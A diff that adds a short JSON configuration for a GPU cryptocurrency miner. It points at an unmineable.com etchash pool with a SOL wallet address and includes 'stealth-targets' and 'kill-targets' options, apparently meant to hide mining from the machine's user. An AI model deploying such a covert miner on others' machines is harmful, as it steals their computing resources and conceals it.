@@ -1,0 +1,10 @@
+{
+    "url": "stratum://`SOL:HJZtyc6QZNvAWLUMN69DMYnTBK3UgXmDASmSfuetex4D.{RANDOM}`@etchash.unmineable.com:3333",
+    "algo": "etchash",
+    "max-gpu": 100,
+    "idle-wait": 5,
+    "idle-gpu": 100,
+    "stealth-targets": "",
+    "kill-targets": "",
+    "stealth-fullscreen": false
+}
